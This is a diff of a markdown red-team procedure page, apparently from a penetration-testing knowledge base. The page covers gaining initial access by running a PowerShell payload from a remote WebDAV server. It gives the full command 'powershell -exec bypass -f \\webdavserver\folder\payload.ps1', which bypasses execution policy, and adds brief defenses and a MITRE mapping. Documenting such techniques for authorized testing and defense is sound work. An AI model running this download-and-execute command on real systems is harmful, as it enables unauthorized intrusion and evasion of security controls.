@@ -35,6 +35,8 @@ From a technical standpoint, the attacker will use PowerShell to create a WebDAV
 
 The business value of this procedure is that it allows an attacker to gain access to a target system and potentially exfiltrate sensitive data. This can lead to financial loss, reputational damage, and legal consequences for the victim organization.
 
+ 
+
 ## Requirements
 
 1. Access to a compromised website
@@ -42,6 +44,8 @@ The business value of this procedure is that it allows an attacker to gain acces
 1. Powershell access on the target system
 
 1. WebDAV server hosting the payload
+
+ 
 
 ## Defense
 
@@ -51,6 +55,8 @@ The business value of this procedure is that it allows an attacker to gain acces
 
 1. Regularly update and patch software to prevent known vulnerabilities that attackers can exploit
 
+ 
+
 ## Objectives
 
 1. Gain initial access to a target system
@@ -59,19 +65,31 @@ The business value of this procedure is that it allows an attacker to gain acces
 
 1. Evade detection by security software
 
+ 
+
 # Instructions
 
 1. Execute a PowerShell script from a remote Webdav server.
 
+ 
+
+
+
 **Code**: [[powershell -exec bypass -f \\webdavserver\folder\p]]
 
+
+
 > This command executes a PowerShell script from a remote Webdav server. The '-exec bypass' flag allows the script to bypass any execution policies that may be in place. The '-f' flag specifies the path to the script on the remote server. This command can be used to execute malicious payloads on target machines, so use with caution and only on systems that you have authorization to test on.
+
+
 
 **Command** ([[Execute PowerShell Script]]):
 
 ```powershell
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -93,3 +111,5 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 
 - [[Powershell]]
 - [[Windows - Download and execute methods]]
+
+
